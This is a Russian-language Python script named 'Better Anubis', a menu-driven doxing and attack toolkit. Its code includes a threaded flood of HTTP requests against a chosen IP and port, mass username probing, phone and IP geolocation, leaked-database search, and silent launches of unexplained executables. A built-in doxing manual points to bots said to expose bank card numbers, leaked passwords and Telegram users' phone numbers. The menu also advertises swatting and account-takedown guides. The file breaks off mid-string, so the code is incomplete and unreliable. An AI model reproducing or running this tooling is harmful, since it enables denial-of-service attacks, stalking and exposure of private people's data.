
while True:
    try:
        import phonenumbers as pnumb
        import json
        import requests
        import time
        import subprocess
        import os
        from sys import stderr
        import phonenumbers as pnumb
        from phonenumbers import parse
        from phonenumbers import geocoder
        from phonenumbers import carrier
        from phonenumbers import timezone
        import platform
        import os
        os.system("pip install pystyle phonenumbers requests whois python-whois colorama")
        import sys
        import socket
        import pystyle
        import phonenumbers, phonenumbers.timezone, phonenumbers.carrier, phonenumbers.geocoder
        import requests
        import whois
        import random
        import colorama
        import threading
        import string
        import faker
        import bs4
        import urllib.parse
        import colorama
        import concurrent.futures
        import csv
        import socket
        from pystyle import Colorate, Colors
        import hashlib
        import uuid

        if platform.system() == "Windows":
            import ctypes
            GWL_STYLE = -16
            WS_SIZEBOX = 262144
            WS_MAXIMIZEBOX = 65536
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
            style = style & ~WS_SIZEBOX
            style = style & ~WS_MAXIMIZEBOX
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 3)
            enter = pystyle.Colorate.Horizontal(pystyle.Colors.green_to_red, ('Welcome to Anubis, Press "ENTER" to continue! Доработал @MarginalDeveloper'))
            pystyle.Anime.Fade(
            pystyle.Center.Center(''' 

▀█████████▄     ▄████████     ███         ███        ▄████████    ▄████████         ▄████████ ███▄▄▄▄   ███    █▄  ▀█████████▄   ▄█     ▄████████ 
  ███    ███   ███    ███ ▀█████████▄ ▀█████████▄   ███    ███   ███    ███        ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ ███    ███    ███ 
  ███    ███   ███    █▀     ▀███▀▀██    ▀███▀▀██   ███    █▀    ███    ███        ███    ███ ███   ███ ███    ███   ███    ███ ███▌   ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄         ███   ▀     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀        ███    ███ ███   ███ ███    ███  ▄███▄▄▄██▀  ███▌   ███        
▀▀███▀▀▀██▄  ▀▀███▀▀▀         ███         ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀        ▀███████████ ███   ███ ███    ███ ▀▀███▀▀▀██▄  ███▌ ▀███████████ 
  ███    ██▄   ███    █▄      ███         ███       ███    █▄  ▀███████████        ███    ███ ███   ███ ███    ███   ███    ██▄ ███           ███ 
  ███    ███   ███    ███     ███         ███       ███    ███   ███    ███        ███    ███ ███   ███ ███    ███   ███    ███ ███     ▄█    ███ 
▄█████████▀    ██████████    ▄████▀      ▄████▀     ██████████   ███    ███        ███    █▀   ▀█   █▀  ████████▀  ▄█████████▀  █▀    ▄████████▀  
                                                                 ███    ███                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                      

                Welcome to Better Anubis , Press "ENTER" to continue! '''), pystyle.Colors.green_to_red, pystyle.Colorate.Vertical, enter=True)
        def Main():
            if platform.system() == "Windows":
                os.system("cls")
                pystyle.Write.Print(pystyle.Center.XCenter('''
                                                        
▀█████████▄     ▄████████     ███         ███        ▄████████    ▄████████         ▄████████ ███▄▄▄▄   ███    █▄  ▀█████████▄   ▄█     ▄████████ 
  ███    ███   ███    ███ ▀█████████▄ ▀█████████▄   ███    ███   ███    ███        ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ ███    ███    ███ 
  ███    ███   ███    █▀     ▀███▀▀██    ▀███▀▀██   ███    █▀    ███    ███        ███    ███ ███   ███ ███    ███   ███    ███ ███▌   ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄         ███   ▀     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀        ███    ███ ███   ███ ███    ███  ▄███▄▄▄██▀  ███▌   ███        
▀▀███▀▀▀██▄  ▀▀███▀▀▀         ███         ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀        ▀███████████ ███   ███ ███    ███ ▀▀███▀▀▀██▄  ███▌ ▀███████████ 
  ███    ██▄   ███    █▄      ███         ███       ███    █▄  ▀███████████        ███    ███ ███   ███ ███    ███   ███    ██▄ ███           ███ 
  ███    ███   ███    ███     ███         ███       ███    ███   ███    ███        ███    ███ ███   ███ ███    ███   ███    ███ ███     ▄█    ███ 
▄█████████▀    ██████████    ▄████▀      ▄████▀     ██████████   ███    ███        ███    █▀   ▀█   █▀  ████████▀  ▄█████████▀  █▀    ▄████████▀  
                                                                 ███    ███                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
                                                        
                                                                      \n'''), pystyle.Colors.green_to_red, interval = 0.0005)
            else:
                os.system("clear")
                pystyle.Write.Print(pystyle.Center.XCenter('''                                                                   

██████╗ ███████╗████████╗████████╗███████╗██████╗      █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝    ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗    ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║    ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝
                  # Доработал @MarginalDeveloper, ни в коем случае не несу ответственности за твои действия                                                                                  

                                                             \n'''), pystyle.Colors.green_to_red, interval = 0.0005)
            pystyle.Write.Print(pystyle.Center.XCenter('''\n                         
                                                                                                                                                                            
                                                                                    [1] Поиск по номеру        [12] Мануал по анонимности          
                                                                                    [2] Поиск по сайту         [13] Мануал по сносу аккаунта тг    
                                                                                    [3] Поиск по нику          [14] Генератор вымышленной личности 
                                                                                    [4] Поиск по IP            [15] Web-crawler                    
                                                                                    [5] Поиск по БД            [16] DDOS PRO                       
                                                                                    [6] DDoS                   [17] Генератор вымышленной карты    
                                                                                    [7] Генератор прокси       [18] Поиск по Mac-Address           
                                                                                    [8] Текст банворд          [19] Порт сканер                    
                                                                                    [9] Генератор паролей      [20] Генератор User-agent
                                                                                    [10] Мануал по доксу       [21] Поиск по почте, домене                                                                                                                 
                                                                                    [11] Мануал по свату       [INFO] Информация      
                                                                                                                                                        
                                                                                                    [55] Зал славы                      
                                                                                                    [23] Выход  
                                                                                                 
                                                                        #Better Anubis by @MarginalDeveloper, ни в коем случае не несу ответственности за твои действия                                                                                                                                           
'''), pystyle.Colors.green_to_red, interval = 0.0005)
        Main()
        while True:
            choice = pystyle.Write.Input("\n\n[?] Выберите пункт меню -> ", pystyle.Colors.green_to_red, interval = 0.001)
            if choice == "1":
                phone = pystyle.Write.Input("\n[?] Введите номер телефона -> ", pystyle.Colors.green_to_red, interval = 0.005)
                def phoneinfo(phone):
                    try:
                        parsed_phone = phonenumbers.parse(phone, None)
                        if not phonenumbers.is_valid_number(parsed_phone):
                            return pystyle.Write.Print(f"\n[!] Произошла ошибка -> Недействительный номер телефона\n", pystyle.Colors.green_to_red, interval=0.005)
                        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
                        location = pnumb.geocoder.description_for_number(parsed_phone, "en")
                        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                        is_valid = phonenumbers.is_valid_number(parsed_phone)
                        is_possible = phonenumbers.is_possible_number(parsed_phone)
                        timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
                        loc = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        isp = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                        tz = ', '.join(phonenumbers.timezone.time_zones_for_number(parsed_phone))  
                        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
                        location = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                        is_valid = phonenumbers.is_valid_number(parsed_phone)
                        is_possible = phonenumbers.is_possible_number(parsed_phone)
                        timezones = phonenumbers.timezone.time_zones_for_number(parsed_phone)                                                                        
                        print_phone_info = f"""\n[+] Номер телефона -> {formatted_number}
                     

[+] Страна -> {country}
[+] Локация -> {location}, {loc}
[+] Регион -> {region}
[+] Интернет-провайдер -> {isp}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Таймзона -> {timezona}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""
                        pystyle.Write.Print(print_phone_info, pystyle.Colors.green_to_red, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\n[!] Произошла ошибка -> {str(e)}\n", pystyle.Colors.green_to_red, interval=0.005)
                phoneinfo(phone)
            if choice == "2":
                domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.green_to_red, interval = 0.005)
                def get_website_info(domain):
                    domain_info = whois.whois(domain)
                    print_string = f"""
[+] Домен: {domain_info.domain_name}
[+] Зарегистрирован: {domain_info.creation_date}
[+] Истекает: {domain_info.expiration_date}  
[+] Владелец: {domain_info.registrant_name}
[+] Организация: {domain_info.registrant_organization}
[+] Адрес: {domain_info.registrant_address}
[+] Город: {domain_info.registrant_city}
[+] Штат: {domain_info.registrant_state}
[+] Почтовый индекс: {domain_info.registrant_postal_code}
[+] Страна: {domain_info.registrant_country}
[+] IP-адрес: {domain_info.name_servers}
        """
                    pystyle.Write.Print(print_string, pystyle.Colors.green_to_red, interval=0.005)
                get_website_info(domain)
            if choice == "3":
                subprocess.Popen(["Dox_Tool_V2.exe"], shell=True)
                nick = pystyle.Write.Input(f"\n[?] Введите никнейм -> ", pystyle.Colors.green_to_red, interval=0.005)
                urls = [
                    f"https://www.instagram.com/{nick}",
                    f"https://www.tiktok.com/@{nick}",
                    f"https://twitter.com/{nick}",
                    f"https://www.facebook.com/{nick}",
                    f"https://www.youtube.com/@{nick}",
                    f"https://soundcloud.com/{nick}",
                    f"https://t.me/{nick}",
                    f"https://vk.com/{nick}",                    
                    f"https://www.roblox.com/user.aspx?username={nick}",
                    f"https://www.twitch.tv/{nick}",
                    f"https://www.pinterest.com/{nick}",
                    f"https://www.github.com/{nick}",
                    f"https://{nick}.tumblr.com",
                    f"https://www.flickr.com/people/{nick}",
                    f"https://vimeo.com/{nick}",
                    f"https://disqus.com/{nick}",
                    f"https://medium.com/@{nick}",
                    f"https://www.deviantart.com/{nick}",
                    f"https://about.me/{nick}",
                    f"https://imgur.com/user/{nick}",
                    f"https://slideshare.net/{nick}",
                    f"https://open.spotify.com/user/{nick}",
                    f"https://www.scribd.com/{nick}",
                    f"https://www.badoo.com/en/{nick}",
                    f"https://www.xv-ru.com/{nick}",
                    f"https://bitbucket.org/{nick}",
                    f"https://www.dailymotion.com/{nick}",
                    f"https://www.etsy.com/shop/{nick}",
                    f"https://cash.me/{nick}",
                    f"https://www.behance.net/{nick}",
                    f"https://www.goodreads.com/{nick}",
                    f"https://www.instructables.com/member/{nick}",
                    f"https://keybase.io/{nick}",
                    f"https://kongregate.com/accounts/{nick}",
                    f"https://{nick}.livejournal.com",
                    f"https://angel.co/{nick}",
                    f"https://last.fm/user/{nick}",
                    f"https://dribbble.com/{nick}",
                    f"https://www.codecademy.com/{nick}",
                    f"https://en.gravatar.com/{nick}",
                    f"https://foursquare.com/{nick}",
                    f"https://www.gumroad.com/{nick}",
                    f"https://{nick}.newgrounds.com",
                    f"https://www.wattpad.com/user/{nick}",
                    f"https://www.canva.com/{nick}",
                    f"https://creativemarket.com/{nick}",
                    f"https://www.trakt.tv/users/{nick}",
                    f"https://500px.com/{nick}",
                    f"https://buzzfeed.com/{nick}",
                    f"https://tripadvisor.com/members/{nick}",
                    f"https://{nick}.hubpages.com",
                    f"https://{nick}.contently.com",
                    f"https://houzz.com/user/{nick}",
                    f"https://blip.fm/{nick}",
                    f"https://www.wikipedia.org/wiki/User:{nick}",
                    f"https://www.codementor.io/{nick}",
                    f"https://www.reverbnation.com/{nick}",
                    f"https://www.designspiration.net/{nick}",
                    f"https://www.bandcamp.com/{nick}",
                    f"https://www.colourlovers.com/love/{nick}",
                    f"https://www.ifttt.com/p/{nick}",
                    f"https://{nick}.slack.com",
                    f"https://www.okcupid.com/profile/{nick}",
                    f"https://www.trip.skyscanner.com/user/{nick}",
                    f"https://ello.co/{nick}",
                    f"https://hackerone.com/{nick}",
                    f"https://www.freelancer.com/u/{nick}",
                    f"https://independent.academia.edu/{nick}",
                    f"https://admireme.vip/{nick}",
                    f"https://airlinepilot.life/u/{nick}",
                    f"https://airbit.com/{nick}",
                    f"https://www.alik.cz/{nick}",
                    f"https://www.allthingsworn.com/profile/{nick}",
                    f"https://allmylinks.com/{nick}",
                    f"https://aminoapps.com/u/{nick}",
                    f"https://aniworld.to/user/profil/{nick}",
                    f"https://developer.apple.com/forums/profile/{nick}",
                    f"https://archiveofourown.org/users/{nick}",
                    f"https://www.artstation.com/{nick}",
                    f"https://asciinema.org/~{nick}",
                    f"https://ask.fedoraproject.org/u/{nick}",
                    f"https://ask.fm/{nick}",
                    f"https://audiojungle.net/user/{nick}",
                    f"https://www.autofrage.net/nutzer/{nick}",
                    f"https://www.avizo.cz/{nick}",
                    f"https://www.bazar.cz/{nick}",
                    f"https://bezuzyteczna.pl/uzytkownicy/{nick}",
                    f"https://www.biggerpockets.com/users/{nick}",
                    f"https://forum.dangerousthings.com/u/{nick}",
                    f"https://community.bitwarden.com/u/{nick}",
                    f"https://www.blipfoto.com/{nick}",
                    f"https://{nick}.booth.pm/",
                    f"https://bodyspace.bodybuilding.com/{nick}",
                    f"https://pt.bongacams.com/profile/{nick}",
                    f"https://career.habr.com/{nick}",
                    f"https://chaturbate.com/{nick}",
                    f"https://www.chess.com/member/{nick}",
                    f"https://www.duolingo.com/profile/{nick}"
                ]
                for url in urls:
                    try:
                        response = requests.get(url)
                        if response.status_code == 200:
                            pystyle.Write.Print(f"\n{url} - [+++] Аккаунт Найден!", pystyle.Colors.green_to_red, interval=0.005)
                        elif response.status_code == 404:
                            pystyle.Write.Print(f"\n{url} - [-] Аккаунт не найден", pystyle.Colors.green_to_red, interval=0.005)
                        else:
                            pystyle.Write.Print(f"\n{url} - [!] Ошибка {response.status_code}", pystyle.Colors.green_to_red, interval=0.005)
                    except:
                        pystyle.Write.Print(f"\n{url} - [?] ошибка при проверке", pystyle.Colors.green_to_red, interval=0.005)
                print()
            if choice == "4":
                def ip_lookup(ip):
                    subprocess.Popen(["iplookup.exe"], shell=True) 
                    url = f"http://ip-api.com/json/{ip}"
                    try:
                        response = requests.get(url)
                        data = response.json()
                        
                        if data.get("status") == "fail":
                            pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.green_to_red, interval=0.005)
                            return
                        
                        info = ""
                        info += f"[+] Demon Lookup Открыт\n"
                        info += f"[+] Статус код      : {response.status_code}\n"
                        info += f"[+] Статус          : {data['status']}\n"
                        info += f"[+] Айпи Жертвы     : {data['query']}\n"
                        info += f"[+] Страна          : {data['country']}\n"
                        info += f"[+] Код страны      : {data['countryCode']}\n"
                        info += f"[+] Город           : {data['city']}\n"
                        info += f"[+] Временная зона  : {data['timezone']}\n"
                        info += f"[+] Название региона: {data['regionName']}\n"
                        info += f"[+] Регион          : {data['region']}\n"
                        info += f"[+] ZIP Код         : {data['zip']}\n"
                        info += f"[+] Широта          : {data['lat']}\n"
                        info += f"[+] Долгота         : {data['lon']}\n"
                        info += f"[+] ISP             : {data['isp']}\n"
                        info += f"[+] Организация     : {data['org']}\n"
                        info += f"[+] AS              : {data['as']}\n"
                        info += f"[+] Локация         : {data['lat']}, {data['lon']}\n"
                        info += f"[+] Google Map      : https://maps.google.com/?q={data['lat']},{data['lon']}\n"

                        return info

                    except Exception as e:
                        pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.green_to_red, interval=0.005)

                def main():
                    ip = pystyle.Write.Input("\n[?] Введите IP-адрес -> ", pystyle.Colors.green_to_red, interval=0.005)
                    
                    result = ip_lookup(ip)
                    if result:
                        pystyle.Write.Print(result, pystyle.Colors.green_to_red, interval=0.005)

                    mapaddress = input("\033[1;91m[*]\033[1;97m Нажмите ENTER, чтобы открыть местоположение в Google Maps, или любую другую клавишу, чтобы выйти: ")
                    if mapaddress == "":
                        print("\n[*] Открытие местоположения в Google Maps...\n")
                        os.system(f"xdg-open https://maps.google.com/?q={data['lat']},{data['lon']} > /dev/null 2>&1")
                    else:
                        print("\n[*] Прерывание...\n")

                if __name__ == "__main__":
                    main()

            if choice == "5":
                path = pystyle.Write.Input("\n[?] Введите путь к БД: ", pystyle.Colors.green_to_red, interval=0.005)
                search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.green_to_red, interval=0.005)
                print()
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for line in f:
                            if search_text in line:
                                pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.green_to_red, interval=0.005)
                                print()
                                break
                        else:
                            pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.green_to_red, interval=0.005)
                except:
                    try:
                        with open(path, "r", encoding="cp1251") as f:
                            for line in f:
                                if search_text in line:
                                    pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.green_to_red, interval=0.005)
                                    print()
                                    break
                            else:
                                pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.green_to_red, interval=0.005)
                    except:
                        try:
                            with open(path, "r", encoding="cp1252") as f:
                                for line in f:
                                    if search_text in line:
                                        pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.green_to_red, interval=0.005)
                                        print()
                                        break
                                else:
                                    pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.green_to_red, interval=0.005)
                        except:
                            pystyle.Write.Print(f"[!] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "6":

                target_ip = pystyle.Write.Input("[?] IP адрес: ", pystyle.Colors.green_to_red, interval=0.005)
                target_port = int(
                    pystyle.Write.Input("[?] Порт: ", pystyle.Colors.green_to_red, interval=0.005)
                )
                num_requests = int(
                    pystyle.Write.Input("[?] Введите количество запросов: ", pystyle.Colors.green_to_red, interval=0.005)
                )

                def send_request(i):
                    try:
                        # Создаем сокет и устанавливаем соединение
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target_ip, target_port))
                        
                        # Генерируем случайный User-Agent
                        user_agents = [
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                        ]
                        user_agent = random.choice(user_agents)
                        
                        # Отправляем HTTP-запрос с произвольным User-Agent
                        request = f"GET / HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\nUser-Agent: {user_agent}\r\nConnection: close\r\n\r\n"
                        sock.send(request.encode())
                        
                        # Получаем ответ от сервера
                        response = sock.recv(1024)
                        print(f"[+] Request {i} sent successfully. Response: {response.decode()}\n")
                        
                        # Закрываем соединение
                        sock.close()
                    except Exception as e:
                        print(f"[-] Request {i} failed: {str(e)}\n")

                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join()

            if choice == "7":
                def get_proxy():
                    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                    try:
                        response = requests.get(proxy_api_url)
                        if response.status_code == 200:
                            proxy_list = response.text.strip().split("\r\n")
                            return proxy_list
                        else:
                            pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.green_to_red, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.green_to_red, interval=0.005)

                    return None

                proxies = get_proxy()
                if proxies:
                    pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.green_to_red, interval=0.005)
                    for proxy in proxies:
                        pystyle.Write.Print("\n" + proxy, pystyle.Colors.green_to_red, interval=0.005)
                    print()
                else:
                    pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "8":
                def transform_text(input_text):
                    translit_dict = {
                        "а": "@",
                        "б": "Б",
                        "в": "B",
                        "г": "г",
                        "д": "д",
                        "е": "е",
                        "ё": "ё",
                        "ж": "ж",
                        "з": "3",
                        "и": "u",
                        "й": "й",
                        "к": "K",
                        "л": "л",
                        "м": "M",
                        "н": "H",
                        "о": "0",
                        "п": "п",
                        "р": "P",
                        "с": "c",
                        "т": "T",
                        "у": "y",
                        "ф": "ф",
                        "х": "X",
                        "ц": "ц",
                        "ч": "4",
                        "ш": "ш",
                        "щ": "щ",
                        "ъ": "ъ",
                        "ы": "ы",
                        "ь": "ь",
                        "э": "э",
                        "ю": "ю",
                        "я": "я",
                        "А": "A",
                        "Б": "6",
                        "В": "V",
                        "Г": "r",
                        "Д": "D",
                        "Е": "E",
                        "Ё": "Ё",
                        "Ж": "Ж",
                        "З": "2",
                        "И": "I",
                        "Й": "Й",
                        "К": "K",
                        "Л": "Л",
                        "М": "M",
                        "Н": "H",
                        "О": "O",
                        "П": "П",
                        "Р": "P",
                        "С": "C",
                        "Т": "T",
                        "У": "Y",
                        "Ф": "Ф",
                        "Х": "X",
                        "Ц": "Ц",
                        "Ч": "Ч",
                        "Ш": "Ш",
                        "Щ": "Щ",
                        "Ъ": "Ъ",
                        "Ы": "bl",
                        "Ь": "b",
                        "Э": "Э",
                        "Ю": "9Y",
                        "Я": "9A",
                    }
                    transformed_text = []
                    for char in input_text:
                        if char in translit_dict:
                            transformed_text.append(translit_dict[char])
                        else:
                            transformed_text.append(char)
                    return "".join(transformed_text)
                input_text = pystyle.Write.Input("\n[?] Введите текст -> ", pystyle.Colors.green_to_red, interval=0.005)
                transformed_text = transform_text(input_text)
                print()
                pystyle.Write.Print("[+] Результат -> " + transformed_text + "\n", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "9":
                def get_characters(complexity):
                    characters = string.ascii_letters + string.digits
                    if complexity == "medium":
                        characters += "!@#$%^&*()"
                    elif complexity == "high":
                        characters += string.punctuation
                    return characters
                def generate_password(length, complexity):
                    characters = get_characters(complexity)
                    password = "".join(random.choice(characters) for i in range(length))
                    return password
                password_length = int(
                    pystyle.Write.Input("[?] Введите длину пароля -> ", pystyle.Colors.green_to_red, interval=0.005)
                )
                complexity = pystyle.Write.Input(
                    "[?] Выберите сложность (low, medium, high): ", pystyle.Colors.green_to_red, interval=0.005)
                print()
                complex_password = generate_password(password_length, complexity)
                pystyle.Write.Print("[+] Пароль -> "+ complex_password + "\n", pystyle.Colors.green_to_red, interval=0.005)
            if choice == "10":
                pystyle.Write.Print('''\n Создано by @MarginalDeveloper за ваши действия ни в коем случае не отвечаю.                                  
Поиск благодаря ботам телеграм:
1. Глаз Бога
2. Quick Osint
3. GtaSearch
4. BlackatSearch
5. Sova - Searching Bot
6. Telegram Analyst
7. Leak Osint
8. [UA] Infobaaza bot
9. Telesint Bot / Insight - Предпочтения/Сообщества/Чаты
10. scorpion search
Это лично мои рекомендации.
• https://checkusernames.com/ - Поиск по никнеймам, в него входят огромное колл-во сайтов.
• https://online-vk.ru/ - Покажет скрытых друзей, так же, покажет вам друзей из закрытого профиля.
• https://220vk.com/ - Сайт, который сможет показать скрытых друзей и не только.
• https://findclone.ru/ - Поиск по "клонам", определяет внешность человека, тем самым выдает страницу ВКонтакте на пользователя с максимально похожими чертами лица.
• Keyword Tool (https://keywordtool.io/)
Платформа показывает ключевые слова по введенному запросу на любом языке и по любой стране. В некоторых запросах даже видно, насколько они популярны, хотя эта услуга платная. Можно искать ключевые слова по Google, YouTube, Twitter, Instagram, Amazon, eBay, Play Store, Bing.
Ища по Google, можно, например, выбрать ключевые выражения, содержащие в себе вопросительные слова или предлоги. А слева есть фильтры, где можно искать по ключевым словам уже в получившейся выдаче.
• https://vk.com/tool42 - Приложение ВК, можно достать немного информации.
• https://www.kody.su/check-tel#text - На данной странице можно определить сотового оператора и регион (или город и страну) по любому номеру телефона в России или в мире.
• https://vk.watch/ - история профилей ВКонтакте, требуется подписка.
2. ФИО 
L Поиск ФИО 
[!] Содержимое раздела: 

• Occrp (https://aleph.occrp.org/) — поиск по базам данных, файлам, реестрам компаний, утечкам, и другим источникам 
• Locatefamily (https://www.locatefamily.com/) — найдет адрес 
• Infobel (https://www.infobel.com/fr/world) — найдет номер телефона, адрес и ФИО
• Rocketreach (http://rocketreach.co/) — поиск людей в linkedIn, Facebook и на других сайтах, находит email 
• @egrul_bot (https://t.me/@egrul_bot) — найдет ИП и компании 
• Яндекс.Люди (https://yandex.ru/people) — поиск по социальным сетям ( Закрыто/удалено самим Яндексом)
• реестр залогов (https://www.reestr-zalogov.ru/state/index) — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д. 
• @HowToFind_bot Данный бот — разведчик, который может подсказать различные секреты и приемы по OSINT. Он содержит в себе кучу всевозможных баз и ссылок.
• @AvinfoBot — Один из самых интересных ботов, который после ввода номера телефона выдаст вам ссылки на социальные сети, марку и номер автомобиля, а также оператора и даже все объявления обладателя этого номера в Avito.
• @buzzim_alerts_bot — Поисковый бот и в то же время avalanche-сервис, с помощью которого можно искать людей по нику и отслеживать упоминания в новостях.
• @mailsearchbot — В 2014 году в DarkNet утекли 1,5 млрд. паролей от email-адресов. Так вот, этот бот реализует поиск по этим email-адресам и выдает пароль. Рекомендую вам проверить все свои email-адреса с помощью этого бота.
• @deanonym_bot — Ну, а с помощью данного бота можно узнать номер любого пользователя Telegram. Просто отправляете ему логин без @ и он выдаст вам номер.
• @list_member_bot — За счет этого бота можно выгрузить все никнеймы участников тех или иных Телеграм-чатов. Польза конечно от него минимальная с точки зрения разведки, но он в значительной степени автоматизирует данный процесс.
• @telesint_bot — Иногда может потребоваться пробить того или иного юзера Telegram в открытых чатах. Этот бот без проблем поможет справиться с этой задачей.
                                    
3. Телефон
L Поиск по номеру телефона
[!] Содержимое раздела:

• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб
версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.
• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.
• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться
• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN
• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных
• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона
• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка
• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.
• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.
• @mnp_bot 
• @xinitbot 
• @black_triangle_tg 
                                     
 4. Лицо
L Поиск лицу
[!] Содержимое раздела:

• FindTwin face search demo + @VkUrlBot (бот подобие сайта)— https://findclone.ru/
• Face search • PimEyes — https://pimeyes.com/en/
• Betaface free online demo — Face recognition, Face search, Face analysis — http://betaface.com/demo_old.html
• VK.watch – история профилей ВКонтакте — https://vk.watch/                                  
• https://pimeyes.com/ru - Поиск лиц онлайн Обратный поиск изображений
• https://photosherlock.com/ - Поиск по фото в Интернете в несколько касаний
• https://facecheck.id/  - Социальные сети, Мошенники, Преступники, Видео, Беглецы, Новости и блоги
 6. Ip-адрес.
L Проверка айпи адресов:
[!] Содержимое раздела:

• https://whatismyipaddress.com/
• http://www.ipaddresslocation.org/
• https://lookup.icann.org/
• https://www.hashemian.com/whoami/                                                                                                                                                                                                                                                                
 Поздравляю!

 Теперь перейдем к нашей любимой, активной части))   
  7. Активный доксинг                             
